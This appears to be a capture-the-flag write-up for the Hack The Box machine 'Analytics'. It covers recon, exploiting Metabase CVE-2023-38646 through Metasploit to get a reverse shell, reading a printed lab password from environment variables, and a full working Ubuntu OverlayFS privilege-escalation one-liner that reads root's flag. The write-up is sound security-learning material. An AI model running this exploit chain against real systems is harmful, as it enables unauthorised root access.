Analytics is an *easy* HTB machine.
## Reconnaissance
Used `nmap` to get an overview of listening ports and a more involved scan for port 80:
```zsh
sudo nmap {ip}
sudo nmap {ip} -p80 -sV -sC
```
```
PORT   STATE SERVICE
22/tcp open  ssh
.
.
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Added `analytical.htb` to our `/etc/hosts` file with `sudo sh -c 'echo "{ip} analytical.htb" >> /etc/hosts'` and opened the page in our browser.

Found a static site with no interesting elements on first look, except for 'Log In' button, which took us to `data.analytical.htb`. This page contained a login-screen for a service called `Metabase`. 

Upon searching for known exploits, we found [CVE 2023-38646](https://nvd.nist.gov/vuln/detail/CVE-2023-38646) which allows RCE on versions <= 0.46.6.1 or 1.46.6.1 and a [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/linux/http/metabase_setup_token_rce.rb) that exploits it. 

## Foothold
Using `msfconsole` and supplying the ip and port, we checked whether the service was vulnerable and we setup a reverse shell. We got a shell as the user `metabase`, which did not have any flag in their directory. We needed to move horizontally to another user with the flag.

## Horizontal movement and user pwn
Enumeration revealed that the environment variables (view with `env`) contained plaintext login details for a user called `metalyzer` in the `Metabase` database. `metalytics@analytical.htb::An4lytics_ds20223#`
We logged in through the webbrowser and indeed got into the database portal. There seemed to be nothing of interest in this database.

We logged in on the machine using `ssh` and the same credentials. With a shell as user `metalyzer` we found the `user.txt` flag.
## Privesc
Enumeration revealed that the kernel version was vulnerable for privelege escelation from user to root. Explanation and steps [on this reddit post](https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/). Edited the code to `cat` out the `root.txt` flag.
```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("cat /root/root.txt
")'
```